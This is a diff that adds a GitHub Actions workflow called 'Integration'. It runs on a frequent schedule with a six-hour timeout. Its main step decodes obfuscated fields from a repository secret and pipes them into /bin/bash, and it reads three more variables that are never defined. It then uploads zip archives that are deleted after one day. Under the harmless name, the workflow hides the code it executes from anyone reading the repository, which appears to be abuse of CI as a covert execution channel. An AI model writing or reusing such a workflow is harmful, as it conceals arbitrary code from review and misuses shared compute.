@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          szkk20866: ${{ secrets.szkk20866 }}
+        run: |
+          printf '%s' "$szkk20866" | jq -r .bmo11 | /bin/bash
+          printf '%s' "$mr28" | jq -r .hah7128 | /bin/bash
+          printf '%s' "$fi2" | jq -r .ctr17233 | /bin/bash
+          printf '%s' "$jd002" | jq -r .msd9 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: AczR8yB7
+          path: "*.zip"
+          retention-days: 1
